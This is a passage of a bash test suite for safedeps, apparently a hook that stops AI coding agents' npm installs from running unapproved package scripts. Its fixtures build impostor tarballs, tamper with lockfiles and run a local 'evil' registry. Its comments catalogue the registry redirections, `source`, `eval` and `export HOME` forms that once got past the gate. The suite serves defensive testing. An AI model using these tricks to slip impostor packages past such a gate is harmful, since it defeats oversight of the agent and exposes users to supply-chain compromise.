# rebuild after an inert install, and the reinstall the rollback used to run.
# What allowed them was a judgment of the change, and three holes in that
# judgment in a row became scripts that ran. The rebuild's permission is now a
# predicate on the whole tree: every package on record, every package under
# node_modules recorded with a public-registry https source or bundled in one,
# every directory outside it a declared workspace member. Otherwise the whole
# rebuild is skipped with a warning that names the package, and nothing is
# rolled back. The rollback runs no package manager at all: it restores the
# files and removes the project's node_modules, and with no confirmed snapshot
# it says so in the message, reorg.log and advisory.log.
#
#   RB1, RB2, CH2b: a rollback with no confirmed snapshot restores a lockfile
#     that holds sd-victim. The reinstall used to run its scripts.
#   CH3c: a rollback to a confirmed snapshot removes node_modules and runs
#     nothing.
#   CH1b, L1, L2: a tree that holds a directory or a source nobody approved,
#     from an earlier unrecorded install or a committed lockfile, is installed
#     and not rebuilt. The rebuild used to run it.
#   K4-K7: committed `file:` directory dependencies. Installed, not rebuilt,
#     named. This is what users see change: the rebuild used to run them.
#   K8, K9, NS1, BD1, BD2: workspaces, the nested strategy and a public
#     package's bundled dependency are rebuilt as before. BD2 spells it
#     `bundledDependencies: true`.
#   NB0-NB2n: a committed lockfile sends the nested sd-swapped@1.0.0 under
#     sd-nester to the EVIL-sd-swapped tarball. NB1 also marks that record
#     `inBundle`, NB2 has the root project bundle sd-nester, and npm then
#     writes `inBundle` into the hidden lockfile itself. Bundling is read from
#     the parent's package.json on disk, so all of them are installed and not
#     rebuilt. The rebuild used to run EVIL for NB1-NB2n.
#   NB3: a public package does bundle the nested package, and its committed
#     record names another source. Not rebuilt: a bundled package has no
#     source of its own.
#   RB1, RB1x: the rollback runs no script, and the message says what ran
#     before it: nothing on Claude Code, the install's own scripts on Codex.
#   OM1: `omit-lockfile-registry-resolved` records no source, so nothing shows
#     the package came from the public registry. Not rebuilt; a boundary.
#   RH1-RH8: a record on registry.npmjs.org is not where the bytes came from.
#     npm's default `replace-registry-host=npmjs` fetches such a URL from the
#     configured registry and records it unchanged, so a second registry here
#     ("evil", 127.0.0.1, its own port and request log) serves EVIL-sd-approved
#     as sd-approved@1.0.0 and every record still reads as the public
#     registry. A registry configured this way is also how a company registry,
#     a mirror or a proxy looks, and safedeps has no path yet to approve one,
#     so the install is neither denied nor rolled back: it is kept, nothing is
#     rebuilt, and the warning names the registry and says to ask the user
#     before rebuilding. That holds wherever npm says so: a committed .npmrc
#     (RH1, the clone RH2), the command's own environment (RH3, RH3e), an
#     .npmrc the command wrote, seen by the post hook's own ask (RH1w, RH2w),
#     and a workspace member under the root's .npmrc, where npm will not
#     answer `npm config` in the member itself (RH8). On Codex safedeps cannot
#     add --ignore-scripts, and the warning says it did not add it, so the
#     install's scripts may already have run (RH3x); where it asked for the
#     flag and the command received is not the one it wrote, the warning says
#     that (RH3c). Where
#     an earlier statement can change npm's environment unseen (`source`),
#     nobody can say, and the rebuild is skipped (RH7). A `--registry` the
#     command spells out stays denied (RH4). RH5 is the control: the sandbox
#     registry, named by SAFEDEPS_NPM_TEST_REGISTRY, is rebuilt as before. The
#     rebuild used to run EVIL for RH1-RH3.
#   P0-P7, P1x, EXP1: the impostor an earlier command fetched, met again by a
#     later one once whatever fetched it is gone. Where bytes came from is a
#     fact of that fetch, so the post hook records it by integrity in
#     SAFEDEPS_HOME, machine-wide, and the whole-tree check looks it up. The
#     later command is kept, not rebuilt, and the warning names the registry
#     and the project that first fetched it: an approved install after a
#     one-shot npm_config_registry (P1, and P1x after a Codex install), a bare
#     `npm install` after the .npmrc is removed (P2), `npm ci` from npm's cache
#     (P3), a rollback to a snapshot confirmed with the impostor (P4, rolled
#     back with node_modules removed and no script run), and another project's `npm ci` of the same
#     lockfile with the same SAFEDEPS_HOME and cache (P5). An exported
#     npm_config_registry is one-shot the same way (EXP1). A record on the
#     public registry with no integrity cannot be matched and is not rebuilt
#     (P7). The bytes leaving the tree releases it (P6), and P0 is two approved
#     installs. The rebuild used to run EVIL for P1-P5, P1x and P7.
#     An install after `source`, `.` or `eval` that npm answers for with the
#     public registry is not among them, on purpose: the SRC rows below. One
#     whose own words name another registry is (the VB rows).
#   Q1-Q5: the same, where the first command fetched bytes a committed
#     lockfile already named, so only the tree from before the command says
#     what was already there. A clone with the impostor's integrity in its
#     lockfile, installed through a committed .npmrc that is then removed (Q1),
#     or through a one-shot npm_config_registry and met again by an approved
#     install (Q2), by `npm ci` from npm's cache (Q3), and by another project's
#     `npm ci` of the same lockfile (Q4). Q5 pairs the impostor's digest with
#     the public one the installed tree already holds. The record skipped the
#     committed integrity and, for Q5, the whole entry, so the rebuild used to
#     run EVIL for Q1-Q5.
#
# Marks a script must never leave: sd-victim, the EVIL tarball and directories,
# and LIB directories, which stand for a committed directory dependency.

# <dir> package <name> whose three install scripts write <mark> lines; reused
# from section 1a (make_dir_package).
set_dependency() {
  jq --arg n "$1" --arg s "$2" '.dependencies[$n] = $s' "${CASE_PROJECT}/package.json" > "${CASE_PROJECT}/package.json.new" \
    && mv "${CASE_PROJECT}/package.json.new" "${CASE_PROJECT}/package.json"
}
line_count() { if [[ -f "$1" ]]; then wc -l < "$1" | tr -d ' '; else printf 0; fi; }
fixture_install() { (cd "${CASE_PROJECT}" && npm install --ignore-scripts "$@" >/dev/null 2>&1) || fail "the fixture installs $*"; }

# A public-registry package that bundles another: sd-bundler carries
# sd-bundled in its own tarball, and the lockfile records sd-bundled as
# `inBundle` with no source of its own. Both have install scripts.
BUNDLER_SRC="${tmp_root}/src/sd-bundler-1.0.0"
make_dir_package "${BUNDLER_SRC}" sd-bundler "sd-bundler@1.0.0"
make_dir_package "${BUNDLER_SRC}/node_modules/sd-bundled" sd-bundled "sd-bundled@1.0.0"
jq '.dependencies = {"sd-bundled": "1.0.0"} | .bundleDependencies = ["sd-bundled"]' "${BUNDLER_SRC}/package.json" \
  > "${BUNDLER_SRC}/package.json.new" && mv "${BUNDLER_SRC}/package.json.new" "${BUNDLER_SRC}/package.json"
(cd "${BUNDLER_SRC}" && npm pack --pack-destination "${tmp_root}/tarballs" >/dev/null 2>&1) || fail "npm pack builds sd-bundler"
cp "${BUNDLER_SRC}/package.json" "${tmp_root}/tarballs/sd-bundler-1.0.0.tgz.json"
integrity_of() { printf 'sha512-%s' "$(node -e 'process.stdout.write(require("crypto").createHash("sha512").update(require("fs").readFileSync(process.argv[1])).digest("base64"))' "$1")"; }
EVIL_INTEGRITY=$(integrity_of "${EVIL_DIR}/sd-approved-1.0.0.tgz")

# The same bundle, declared as `bundledDependencies: true`, which npm reads as
# every name in dependencies.
BUNDLERT_SRC="${tmp_root}/src/sd-bundlert-1.0.0"
make_dir_package "${BUNDLERT_SRC}" sd-bundlert "sd-bundlert@1.0.0"
make_dir_package "${BUNDLERT_SRC}/node_modules/sd-bundled" sd-bundled "sd-bundled@1.0.0"
jq '.dependencies = {"sd-bundled": "1.0.0"} | .bundledDependencies = true' "${BUNDLERT_SRC}/package.json" \
  > "${BUNDLERT_SRC}/package.json.new" && mv "${BUNDLERT_SRC}/package.json.new" "${BUNDLERT_SRC}/package.json"
(cd "${BUNDLERT_SRC}" && npm pack --pack-destination "${tmp_root}/tarballs" >/dev/null 2>&1) || fail "npm pack builds sd-bundlert"
cp "${BUNDLERT_SRC}/package.json" "${tmp_root}/tarballs/sd-bundlert-1.0.0.tgz.json"

# sd-nester@1.0.0 depends on sd-swapped@1.0.0, so a project that depends on
# sd-swapped@1.0.1 nests sd-swapped@1.0.0 under it. EVIL-sd-swapped is a
# tarball named sd-swapped@1.0.0 whose scripts write EVIL lines, served as
# sd-evilswap so an http URL fetches it.
NESTER_SRC="${tmp_root}/src/sd-nester-1.0.0"
make_dir_package "${NESTER_SRC}" sd-nester "sd-nester@1.0.0"
jq '.dependencies = {"sd-swapped": "1.0.0"}' "${NESTER_SRC}/package.json" \
  > "${NESTER_SRC}/package.json.new" && mv "${NESTER_SRC}/package.json.new" "${NESTER_SRC}/package.json"
(cd "${NESTER_SRC}" && npm pack --pack-destination "${tmp_root}/tarballs" >/dev/null 2>&1) || fail "npm pack builds sd-nester"
cp "${NESTER_SRC}/package.json" "${tmp_root}/tarballs/sd-nester-1.0.0.tgz.json"
make_dir_package "${EVIL_DIR}/swap" sd-swapped "EVIL-sd-swapped@1.0.0"
(cd "${EVIL_DIR}/swap" && npm pack --pack-destination "${EVIL_DIR}" >/dev/null 2>&1) || fail "npm pack builds the impostor sd-swapped"
cp "${EVIL_DIR}/sd-swapped-1.0.0.tgz" "${tmp_root}/tarballs/sd-evilswap-1.0.0.tgz"
cp "${EVIL_DIR}/swap/package.json" "${tmp_root}/tarballs/sd-evilswap-1.0.0.tgz.json"
EVIL_SWAP_URL="http://127.0.0.1:$(cat "${tmp_root}/registry.port")/sd-evilswap/-/sd-evilswap-1.0.0.tgz"
EVIL_SWAP_INTEGRITY=$(integrity_of "${EVIL_DIR}/sd-swapped-1.0.0.tgz")
NESTED_KEY=node_modules/sd-nester/node_modules/sd-swapped

new_rb_clone() { new_project; set_dependency sd-victim 1.0.0; fixture_install; rm -rf "${CASE_PROJECT}/node_modules"; }
new_rb_has() { new_project; fixture_install sd-victim@1.0.0; }
# CH1a, CH2a, CH3a-b: the commands before the row's, run through the hooks.
new_ch1() {
  new_project; fixture_install sd-approved@1.0.0
  rm -rf "${CASE_PROJECT}/../evildir"; make_evil_dir "${CASE_PROJECT}/../evildir" evildir
  run_install 'command cd sub; npm install ../../evildir'
  ungated || fail "CH1a is recorded UNGATED"
  CASE_CWD="${CASE_PROJECT}/sub"
}
new_ch2() {
  new_project
  run_install 'command cd sub; npm install sd-victim'
  ungated || fail "CH2a is recorded UNGATED"
  CASE_CWD="${CASE_PROJECT}/sub"
}
new_ch3() {
  new_project
  CASE_CWD="${CASE_PROJECT}/sub"; run_install 'npm install sd-approved@1.0.0'
  [[ -z "${CASE_POST}" ]] || fail "CH3a confirms quietly (post: ${CASE_POST})"
  CASE_CWD="${CASE_PROJECT}"; run_install 'command cd sub; npm install sd-victim'
  ungated || fail "CH3b is recorded UNGATED"
  CASE_CWD="${CASE_PROJECT}/sub"
}
# A committed lockfile whose entry for the approved sd-approved@1.0.0 resolves
# to the EVIL tarball over http, with that tarball's integrity.
new_tampered() {
  new_project; set_dependency sd-approved '^1.0.0'; fixture_install
  jq --arg u "${EVIL_URL}" --arg i "${EVIL_INTEGRITY}" \
    '.packages["node_modules/sd-approved"].resolved = $u | .packages["node_modules/sd-approved"].integrity = $i' \
    "${CASE_PROJECT}/package-lock.json" > "${CASE_PROJECT}/package-lock.json.new"
  mv "${CASE_PROJECT}/package-lock.json.new" "${CASE_PROJECT}/package-lock.json"
  rm -rf "${CASE_PROJECT}/node_modules"
}
# npm 9.0-9.3 copy a `file:` directory instead of linking it unless told
# otherwise (lockless-forms.sh section 10). The case here is the link.
new_hasfiledir() {
  new_project; printf 'install-links=false\n' > "${CASE_PROJECT}/.npmrc"; rm -rf "${CASE_PROJECT}/../libdir"; make_dir_package "${CASE_PROJECT}/../libdir" libdir LIB-libdir
  set_dependency libdir file:../libdir; fixture_install
}
new_clonefiledir() { new_hasfiledir; rm -rf "${CASE_PROJECT}/node_modules"; }
new_cloneinside() {
  new_project; printf 'install-links=false\n' > "${CASE_PROJECT}/.npmrc"; make_dir_package "${CASE_PROJECT}/local/lib" lib LIB-lib
  set_dependency lib file:./local/lib; fixture_install; rm -rf "${CASE_PROJECT}/node_modules"
}
new_wsclone() { new_workspace; rm -rf "${CASE_PROJECT}/node_modules"; }
new_bundler() {
  new_project
  ( export SAFEDEPS_HOME="${CASE_HOME}"
    . lib/ledger/ledger.sh
    safedeps_ledger_write_approved_spec npm sd-bundler 1.0.0 >/dev/null
    safedeps_ledger_write_approved_spec npm sd-bundled 1.0.0 >/dev/null ) || fail "the fixture approves sd-bundler"
}
new_bundlert() {
  new_project
  ( export SAFEDEPS_HOME="${CASE_HOME}"
    . lib/ledger/ledger.sh
    safedeps_ledger_write_approved_spec npm sd-bundlert 1.0.0 >/dev/null
    safedeps_ledger_write_approved_spec npm sd-bundled 1.0.0 >/dev/null ) || fail "the fixture approves sd-bundlert"
}
# <file> edited by <jq filter> in the project.
edit_json() {
  local file="${CASE_PROJECT}/$1"; shift
  jq "$@" "${file}" > "${file}.new" && mv "${file}.new" "${file}"
}
# A clone whose committed lockfile nests sd-swapped@1.0.0 under sd-nester and
# sends it to the EVIL-sd-swapped tarball.
new_nested() {
  new_project
  ( export SAFEDEPS_HOME="${CASE_HOME}"
    . lib/ledger/ledger.sh
    safedeps_ledger_write_approved_spec npm sd-nester 1.0.0 >/dev/null
    safedeps_ledger_write_approved_spec npm sd-swapped 1.0.1 >/dev/null ) || fail "the fixture approves sd-nester"
  set_dependency sd-nester 1.0.0; set_dependency sd-swapped 1.0.1; fixture_install
  jq -e --arg k "${NESTED_KEY}" '.packages[$k].version == "1.0.0"' "${CASE_PROJECT}/package-lock.json" >/dev/null \
    || fail "the fixture nests sd-swapped@1.0.0 under sd-nester"
  edit_json package-lock.json --arg k "${NESTED_KEY}" --arg u "${EVIL_SWAP_URL}" --arg i "${EVIL_SWAP_INTEGRITY}" \
    '.packages[$k].resolved = $u | .packages[$k].integrity = $i'
  rm -rf "${CASE_PROJECT}/node_modules"
}
new_nested_flagged() { new_nested; edit_json package-lock.json --arg k "${NESTED_KEY}" '.packages[$k].inBundle = true'; }
new_nested_rootbundle() { new_nested; edit_json package.json '.bundleDependencies = ["sd-nester"]'; }
# A clone of a project that depends on sd-bundler, whose committed record of
# the bundled sd-bundled names the EVIL tarball as its source.
new_bundled_sourced() {
  new_bundler; set_dependency sd-bundler 1.0.0; fixture_install
  edit_json package-lock.json --arg u "${EVIL_URL}" --arg i "${EVIL_INTEGRITY}" \
    '.packages["node_modules/sd-bundler/node_modules/sd-bundled"] += {resolved: $u, integrity: $i}'
  rm -rf "${CASE_PROJECT}/node_modules"
}
new_omit() { new_project; printf 'omit-lockfile-registry-resolved=true\n' > "${CASE_PROJECT}/.npmrc"; }

# The evil registry: the same fixture server on its own port, serving only the
# impostor sd-approved@1.0.0 (EVIL-sd-approved, from section 1a), and logging
# every request on its own. It writes registry.npmjs.org tarball URLs, as the
# sandbox registry does, so what npm records is indistinguishable.
EVILREG_DIR="${tmp_root}/evilreg"
mkdir -p "${EVILREG_DIR}/tarballs"
cp "${EVIL_DIR}/sd-approved-1.0.0.tgz" "${EVILREG_DIR}/tarballs/sd-approved-1.0.0.tgz"
cp "${EVIL_DIR}/src/package.json" "${EVILREG_DIR}/tarballs/sd-approved-1.0.0.tgz.json"
( cd "${tmp_root}" && exec -a "${CHILD_MARKER}" \
    node "${ROOT_DIR}/scripts/test/fixture-registry.mjs" \
    "${EVILREG_DIR}/registry.port" "${EVILREG_DIR}/tarballs" "${EVILREG_DIR}/registry.log" ) &
owned_children+=("$!")
for _ in {1..50}; do [[ -s "${EVILREG_DIR}/registry.port" ]] && break; sleep 0.1; done
[[ -s "${EVILREG_DIR}/registry.port" ]] || fail "the evil fixture registry starts"
EVIL_REG="http://127.0.0.1:$(cat "${EVILREG_DIR}/registry.port")/"
[[ "${EVIL_REG}" != "${SAFEDEPS_NPM_TEST_REGISTRY}" ]] || fail "the evil registry is not the one the sandbox names"
NPMJS_APPROVED_URL="https://registry.npmjs.org/sd-approved/-/sd-approved-1.0.0.tgz"
new_evilrc() { new_project; printf 'registry=%s\n' "${EVIL_REG}" > "${CASE_PROJECT}/.npmrc"; }
# A clone: the committed lockfile was written from the sandbox registry, so it
# records the npmjs URL, and its integrity is then set to the impostor's.
new_evilclone_bare() {
  new_project; set_dependency sd-approved 1.0.0; fixture_install
  jq -e --arg u "${NPMJS_APPROVED_URL}" '.packages["node_modules/sd-approved"].resolved == $u' \
    "${CASE_PROJECT}/package-lock.json" >/dev/null || fail "the clone fixture records the npmjs URL"
  edit_json package-lock.json --arg i "${EVIL_INTEGRITY}" '.packages["node_modules/sd-approved"].integrity = $i'
  rm -rf "${CASE_PROJECT}/node_modules"
}
new_evilclone() { new_evilclone_bare; printf 'registry=%s\n' "${EVIL_REG}" > "${CASE_PROJECT}/.npmrc"; }
# A workspace whose root .npmrc names the evil registry, installed from inside
# a member: npm reads the root's .npmrc there, and refuses `npm config` in a
# member (ENOWORKSPACES), so the gate has to ask at the root npm names.
new_evilws() { new_workspace; printf 'registry=%s\n' "${EVIL_REG}" > "${CASE_PROJECT}/.npmrc"; CASE_CWD="${CASE_PROJECT}/packages/a"; }
new_evilenvfile() { new_project; printf 'export npm_config_registry=%s\n' "${EVIL_REG}" > "${CASE_PROJECT}/npmenv.sh"; }
# The P rows: bytes withheld by one command, met again by a later one after
# whatever fetched them is gone. <form> is run first, through the hooks, on
# <engine>, and must be kept without a rebuild. FIRST_PROJECT is where it ran,
# which the later warning has to name (@FIRST@ in the rows).
withhold_first() {
  local form="$1" engine="${2:-claude}"
  run_install "${form}" "${engine}"
  [[ -z "${CASE_PRE_DENY}" && "${CASE_INSTALL_RC}" == 0 ]] || fail "the first command of the row is let through and succeeds: ${form}"
  ! rolled_back || fail "the first command of the row is kept: ${form} (post: ${CASE_POST:0:300})"
  grep -q 'EVIL-sd-approved' "${CASE_PROJECT}/node_modules/sd-approved/mark.js" 2>/dev/null \
    || fail "the first command of the row installs the impostor: ${form}"
  FIRST_PROJECT="${CASE_PROJECT}"
}
RH3_FORM="npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0"
new_p0() { new_project; run_install 'npm install sd-approved@1.0.0'; [[ -z "${CASE_POST}" ]] || fail "P0's first install confirms quietly (post: ${CASE_POST:0:300})"; }
new_p1() { new_project; withhold_first "${RH3_FORM}"; }
new_p1x() { new_project; withhold_first "${RH3_FORM}" codex; }
new_p2() { new_evilrc; withhold_first 'npm install sd-approved@1.0.0'; rm -f "${CASE_PROJECT}/.npmrc"; }
new_p3() { new_p1; rm -rf "${CASE_PROJECT}/node_modules"; }
new_p4() { new_p1; }
new_p5() {
  local first_home
  new_p1; first_home="${CASE_HOME}"
  new_project
  CASE_HOME="${first_home}"
  cp "${FIRST_PROJECT}/package.json" "${FIRST_PROJECT}/package-lock.json" "${CASE_PROJECT}/"
  rm -rf "${CASE_PROJECT}/node_modules"
}
new_p6() { new_p1; rm -rf "${CASE_PROJECT}/node_modules" "${CASE_PROJECT}/package-lock.json"; }
new_p7() {
  new_p1
  local f
  for f in package-lock.json node_modules/.package-lock.json; do
    edit_json "${f}" 'del(.packages[]?.integrity)'
  done
}
new_exp1() { new_project; withhold_first "export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0"; }
new_q1() { new_evilclone; withhold_first 'npm ci'; rm -f "${CASE_PROJECT}/.npmrc"; }
new_q2() { new_evilclone_bare; withhold_first "npm_config_registry=${EVIL_REG} npm ci"; }
new_q3() { new_q2; rm -rf "${CASE_PROJECT}/node_modules"; }
new_q4() {
  local first_home
  new_q2; first_home="${CASE_HOME}"
  new_project
  CASE_HOME="${first_home}"
  cp "${FIRST_PROJECT}/package.json" "${FIRST_PROJECT}/package-lock.json" "${CASE_PROJECT}/"
  rm -rf "${CASE_PROJECT}/node_modules"
}
# The public sd-approved installed, then its committed integrity extended with
# the impostor's digest. npm accepts bytes that match either, and the cache is
# emptied so that it fetches them rather than finding the public ones by theirs.
new_q5() {
  local public
  new_project; set_dependency sd-approved 1.0.0; fixture_install
  public=$(jq -r '.packages["node_modules/sd-approved"].integrity' "${CASE_PROJECT}/package-lock.json")
  [[ "${public}" == sha512-* && "${public}" != "${EVIL_INTEGRITY}" ]] || fail "the Q5 fixture records the public integrity"
  edit_json package-lock.json --arg i "${EVIL_INTEGRITY} ${public}" '.packages["node_modules/sd-approved"].integrity = $i'
  printf 'registry=%s\n' "${EVIL_REG}" > "${CASE_PROJECT}/.npmrc"
  rm -rf "${npm_config_cache:?the sandbox sets the npm cache}"
  withhold_first 'npm ci'; rm -f "${CASE_PROJECT}/.npmrc"
}

# The HL rows: the Q clone, but what it commits is the tree record
# node_modules/.package-lock.json naming the impostor's integrity, and none of
# the bytes. The pre-guard copies that file as the tree before the command, and
# it is a record nobody saw written, as the committed package-lock.json is.
new_hclone_bare() {
  local f
  new_project; set_dependency sd-approved 1.0.0; fixture_install
  for f in package-lock.json node_modules/.package-lock.json; do
    jq -e --arg u "${NPMJS_APPROVED_URL}" '.packages["node_modules/sd-approved"].resolved == $u' \
      "${CASE_PROJECT}/${f}" >/dev/null || fail "the H clone fixture records the npmjs URL in ${f}"
  done
  edit_json package-lock.json --arg i "${EVIL_INTEGRITY}" '.packages["node_modules/sd-approved"].integrity = $i'
  edit_json node_modules/.package-lock.json --arg i "${EVIL_INTEGRITY}" '.packages["node_modules/sd-approved"].integrity = $i'
  rm -rf "${CASE_PROJECT}/node_modules/sd-approved"
  [[ "$(ls -A "${CASE_PROJECT}/node_modules")" == .package-lock.json ]] || fail "the H clone carries the tree record alone"
}
new_hclone() { new_hclone_bare; printf 'registry=%s\n' "${EVIL_REG}" > "${CASE_PROJECT}/.npmrc"; }
new_hl1() { new_hclone; withhold_first 'npm ci'; rm -f "${CASE_PROJECT}/.npmrc"; }
new_hl2() { new_hclone_bare; withhold_first "npm_config_registry=${EVIL_REG} npm ci"; }
new_hl3() { new_hl2; rm -rf "${CASE_PROJECT}/node_modules"; }
new_hl4() {
  local first_home
  new_hl2; first_home="${CASE_HOME}"
  new_project
  CASE_HOME="${first_home}"
  cp "${FIRST_PROJECT}/package.json" "${FIRST_PROJECT}/package-lock.json" "${CASE_PROJECT}/"
  rm -rf "${CASE_PROJECT}/node_modules"
}
# DP1: a tree record the gate did observe, whose entry pairs the impostor's
# sha512 with the public one. The public bytes were installed through the hooks,
# so the tree is observed, and they match only the public digest: the entry
# vouches for neither.
new_dp1() {
  local public
  new_project; set_dependency sd-approved 1.0.0; fixture_install
  public=$(jq -r '.packages["node_modules/sd-approved"].integrity' "${CASE_PROJECT}/package-lock.json")
  [[ "${public}" == sha512-* && "${public}" != "${EVIL_INTEGRITY}" ]] || fail "the DP1 fixture records the public integrity"
  edit_json package-lock.json --arg i "${EVIL_INTEGRITY} ${public}" '.packages["node_modules/sd-approved"].integrity = $i'
  rm -rf "${CASE_PROJECT}/node_modules" "${npm_config_cache:?the sandbox sets the npm cache}"
  run_install 'npm ci'
  [[ -z "${CASE_PRE_DENY}" && "${CASE_INSTALL_RC}" == 0 ]] && ! rolled_back || fail "DP1's public npm ci is kept (post: ${CASE_POST:0:300})"
  ! grep -q 'EVIL-sd-approved' "${CASE_PROJECT}/node_modules/sd-approved/mark.js" 2>/dev/null || fail "DP1's public npm ci installs the public bytes"
  [[ "$(jq -r '.packages["node_modules/sd-approved"].integrity' "${CASE_PROJECT}/node_modules/.package-lock.json")" == "${EVIL_INTEGRITY} ${public}" ]] \
    || fail "npm keeps both digests in the tree record, or DP1 tests nothing"
  rm -rf "${npm_config_cache}"
  withhold_first "npm_config_registry=${EVIL_REG} npm ci"
}
# The UK rows: what an install npm cannot be asked about records. Its answer is
# unknown, so it records every integrity a tree it has not observed holds,
# public ones included (UK0a: a tree installed outside the hooks, UK1a: a
# clone), and only what it brings in to a tree the hooks observed (UK2). The
# later command installs the public sd-approved in another project. What
# leaves npm's answer unknown here is a setting the gate reads but cannot
# reproduce: `set -a` (UK0a, UK1a, UK2), a `declare -x` that changes the value
# it stores (`-xi`, UK1d), an npm_config_* assignment (UK1v), and `set -a`
# beside a `source` (MX1). A literal `declare -x` is carried to the ask like an
# export (XH4).
#
# Code the command runs first is the exception (UK0, UK1, and the SRC rows):
# after `source`, `.` or `eval`, where npm answers the public registry, the
# install's scripts are withheld for that command, but nothing is recorded and
# the tree is not left observed. Whoever controls that code already runs code
# in the agent's shell, so a record would protect nothing against them, and
# UK0 and UK1 measured what it cost: every package of the tree, public ones
# included, withheld on the whole machine. Where npm names another registry,
# its answer is recorded whatever code ran first (the VB rows).
new_benignenv() { printf 'export SD_BENIGN=1\n' > "${CASE_PROJECT}/sdenv.sh"; }
unknown_first() {
  local first_home
  new_benignenv
  run_install "$1"
  [[ -z "${CASE_PRE_DENY}" && "${CASE_INSTALL_RC}" == 0 ]] && ! rolled_back || fail "the unknown command of the row is kept: $1 (post: ${CASE_POST:0:300})"
  FIRST_PROJECT="${CASE_PROJECT}"; first_home="${CASE_HOME}"
  new_project
  CASE_HOME="${first_home}"
}
new_tree() { new_project; set_dependency sd-approved 1.0.0; fixture_install; }
new_clone() { new_tree; rm -rf "${CASE_PROJECT}/node_modules"; }
new_uk0() { new_tree; unknown_first 'source ./sdenv.sh && npm install sd-swapped@1.0.0'; }
new_uk1() { new_clone; unknown_first 'source ./sdenv.sh && npm ci'; }
new_uk0a() { new_tree; unknown_first 'set -a && npm install sd-swapped@1.0.0'; }
new_uk1a() { new_clone; unknown_first 'set -a && npm ci'; }
new_uk1d() { new_clone; unknown_first 'declare -xi SD_BENIGN=1 && npm ci'; }
new_uk1v() { new_clone; unknown_first 'npm_config_fund=false; npm ci'; }
new_mx1() { new_clone; unknown_first 'set -a; source ./sdenv.sh && npm ci'; }
new_uk2() {
  new_project; run_install 'npm install sd-approved@1.0.0'
  [[ -z "${CASE_POST}" ]] || fail "UK2's first install confirms quietly (post: ${CASE_POST:0:300})"
  unknown_first 'set -a && npm install sd-swapped@1.0.0'
}

# The SRC rows: <form> runs code from a file or an eval payload, then installs.
# It is run here, as the row's first command, and must be kept with nothing
# rebuilt, a warning that says why nothing was recorded, and the record of
# withheld bytes and the observed tree hashes as they were. The row is the next
# ordinary install in the same project, which npm answers for, and which
# rebuilds the tree.
SOURCED_SAYS="It has not recorded these bytes as withheld: whoever controls that code already runs code in this shell, so a record would protect nothing against them. The next install npm says fetches from the public npm registry rebuilds them as usual"
# Either directory may not exist yet, and find then fails, which under
# pipefail would end the battery: an absent directory is an empty one here.
home_records() { (cd "${CASE_HOME}" && { find npm-withheld npm-observed -type f -exec cksum {} + 2>/dev/null || true; } | sort); }
sourced_first() {
  local id="$1" form="$2" before
  new_benignenv
  before=$(home_records)
  run_install "${form}"
  if [[ -n "${CASE_PRE_DENY}" || "${CASE_INSTALL_RC}" != 0 ]] || rolled_back; then
    note_failure "${id}: the first command is let through and kept: ${form} (deny: ${CASE_PRE_DENY:0:160}, rc ${CASE_INSTALL_RC}, post: ${CASE_POST:0:300})"
    return 0
  fi
  printf '%-4s %-7s %s | ran=[%s] post=[%s]\n' "${id}" first "${form}" \
    "$(cut -f1,2 <<< "${CASE_RAN}" | tr '\t' ':' | paste -sd, -)" \
    "$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | tr '\n' ' ' | head -c 300)"
  [[ -z "${CASE_RAN}" ]] || note_failure "${id}: the first command rebuilds nothing (${CASE_RAN})"
  grep -qF "${SOURCED_SAYS}" <<< "${CASE_POST}" \
    || note_failure "${id}: the first command's warning says why nothing is recorded (post: ${CASE_POST:0:400})"
  [[ "$(home_records)" == "${before}" ]] \
    || note_failure "${id}: the first command records nothing withheld and leaves no tree observed ($(home_records | paste -sd' ' -))"
}
new_src1() { new_clone; sourced_first SRC1 'source ./sdenv.sh && npm ci'; }
new_src2() { new_project; sourced_first SRC2 '. ./sdenv.sh && npm install sd-approved@1.0.0'; }
new_src3() { new_clone; sourced_first SRC3 'eval "export SD_BENIGN=1" && npm ci'; }
# The VB rows: code ahead of an install whose registry the command itself
# names. npm answers for the command's own words, and an answer that is not
# the public registry stands and is recorded as P1's and EXP1's are, whatever
# code runs before it (VB1-VB3). Code whose own text names an npm setting is a
# setting the gate reads but does not reproduce, recorded as UK1v's is (EV1).
# Code that is a no-op used to discard npm's answer, so nothing was recorded
# and the next approved install rebuilt the impostor (VB1-VB3, EV1).
new_vb1() { new_project; withhold_first ". /dev/null; ${RH3_FORM}"; }
new_vb2() { new_project; withhold_first "eval true; export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0"; }
new_vb3() { new_project; withhold_first "source /dev/null && export npm_config_registry=${EVIL_REG} && npm install sd-approved@1.0.0"; }
new_ev1() { new_project; withhold_first "eval \"export npm_config_registry=${EVIL_REG}\"; npm install sd-approved@1.0.0"; }
# The XH rows: an export that moves npm's configuration without naming an npm
# setting. npm reads its user .npmrc from HOME, so `export HOME=<dir>` sends
# the install to <dir>/.npmrc and the registry it names. The pre-guard's ask
# carried only npm_config_* exports, so it answered under the hook's HOME, the
# PostToolUse hook's ask did too, both said the public registry, and the first
# command rebuilt the impostor (XH1-XH3 on e965c09). `declare -x` left the
# answer unknown instead (XH4 there). An assignment the command does not
# export reaches npm too, because HOME is exported already (XH5). The XC rows
# are the forms the ask saw before: the same HOME in front of npm, through
# env(1), and an exported NPM_CONFIG_REGISTRY. An exported value the shell
# decides at run time leaves the answer unknown, and is recorded (XU1).
#
# The sandbox points npm at its userconfig through npm_config_userconfig,
# which outranks HOME, so these rows run with it unset and the same file at
# $HOME/.npmrc, and put it back before the row's own install.
XH_HOME="${tmp_root}/xh-home"
mkdir -p "${XH_HOME}"
printf 'registry=%s\nprefix=%s\n' "${EVIL_REG}" "${tmp_root}/global" > "${XH_HOME}/.npmrc"
home_first() {
  local form="$1" userconfig="${npm_config_userconfig}"
  new_project
  cp "${userconfig}" "${HOME}/.npmrc"
  unset npm_config_userconfig
  [[ "$(cd "${CASE_PROJECT}" && npm config get registry 2>/dev/null)" == "${SAFEDEPS_NPM_TEST_REGISTRY}" ]] \
    || fail "without npm_config_userconfig npm still reads the sandbox registry from \$HOME/.npmrc"
  withhold_first "${form}"
  export npm_config_userconfig="${userconfig}"
  rm -f "${HOME}/.npmrc"
  printf '%-4s %-7s %s | ran=[%s] post=[%s]\n' "${2}" first "${form}" \
    "$(cut -f1,2 <<< "${CASE_RAN}" | tr '\t' ':' | paste -sd, -)" \
